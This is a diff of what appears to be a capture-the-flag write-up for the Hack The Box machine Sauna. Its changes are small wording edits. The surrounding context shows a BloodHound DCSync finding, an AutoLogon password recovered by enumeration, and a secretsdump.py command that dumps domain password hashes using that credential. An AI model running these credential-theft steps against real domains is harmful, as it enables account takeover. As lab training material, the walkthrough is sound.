@@ -324,8 +324,8 @@ root@kali:~# bloodhound
 
 ```
 
-If all setting is done, we can login and see the empty view.<br>
-We can drag/drop all json files to import the domain data to the database.
+If the initial setting is done, we can login and see the empty view.<br>
+We can drag/drop all json files to import the domain information to the database.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-21/2020-07-20-23-53-15.png)
 
 Using the query `Find Principals with DCSync Rights`, we can find out that `svc_loanmgr` has `GetChangesAll` right.<br>
@@ -1138,7 +1138,7 @@ To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fus
     Not Found
 ```
 
-Here we found the AutoLogon credentials for `EGOTISTICALBANK\svc_loanmanager`.
+Note we found the AutoLogon credential for `EGOTISTICALBANK\svc_loanmanager`.
 ```shell
   [+] Looking for AutoLogon credentials(T1012)
     Some AutoLogon credentials were found!!
@@ -1147,7 +1147,7 @@ Here we found the AutoLogon credentials for `EGOTISTICALBANK\svc_loanmanager`.
     DefaultPassword               :  Moneymakestheworldgoround!
 ```
 
-Now we got the credential for `svc_loanmgr` with DCSync permissions. We can use [secretdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump all password hashes.
+Since we got the credential for `svc_loanmgr` with DCSync permissions, we can use [secretdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump all password hashes.
 ```shell
 root@kali:~# /usr/local/bin/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
